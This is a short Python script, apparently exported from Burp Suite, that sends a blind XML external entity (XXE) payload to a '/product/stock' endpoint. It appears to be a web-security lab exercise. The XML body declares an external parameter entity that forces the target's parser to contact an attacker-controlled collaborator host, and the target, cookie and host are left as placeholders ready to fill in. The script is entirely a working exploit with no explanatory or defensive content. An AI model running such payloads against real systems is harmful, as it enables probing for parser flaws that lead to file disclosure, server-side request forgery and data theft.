import requests

burp0_url = "https://YOUR_URL/product/stock"
burp0_cookies = {"session": "YOUR_SESSION"}
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*", 
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/xml",
    "Origin": "YOUR_URL", 
    "Sec-Fetch-Dest": "empty", 
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
    "Te": "trailers"
}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://YOUR_COLLABORATOR\"> %xxe; ]>\r\n<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)